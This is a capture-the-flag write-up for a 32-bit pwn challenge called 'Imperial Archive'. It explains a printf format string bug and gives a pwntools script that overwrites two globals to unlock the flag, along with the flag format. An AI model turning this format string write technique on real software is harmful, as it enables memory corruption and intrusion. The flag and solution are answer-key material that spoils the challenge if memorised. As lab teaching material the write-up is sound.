# Imperial Archive

**Category:** pwn  **Author:** Solvz

Players got `local/imperial_archive` (32-bit, no PIE). Server side: `cd deploy && docker compose up --build`. Source is in `src/`. The folder is also zipped as `../chal3.zip`.

## Solution

The binary asks for a "royal inscription" and passes it straight to `printf(buffer)`. Right after, `imperial_access()` prints the flag if two globals hold the right values:

```c
if (mauryan_empire == 0x141 && ashoka_edict >= 0x397B)
```

Both are globals at fixed addresses, so it's a textbook format string write. Sending `AAAA%p.%p.%p.%p.%p` shows our input at offset 4. pwntools does the rest:

```python
elf = ELF('./imperial_archive')
payload = fmtstr_payload(4, {
    elf.symbols['mauryan_empire']: 0x141,
    elf.symbols['ashoka_edict']:   0x397B,
}, write_size='short')
p.sendlineafter(b'inscription: ', payload)
print(p.recvall().decode(errors='ignore'))
```

That's `solve.py`.

Flag is per-instance: `H7CTF{m4ury4n_p|114r_c|ph3r_321|8C3_<uuid>}`
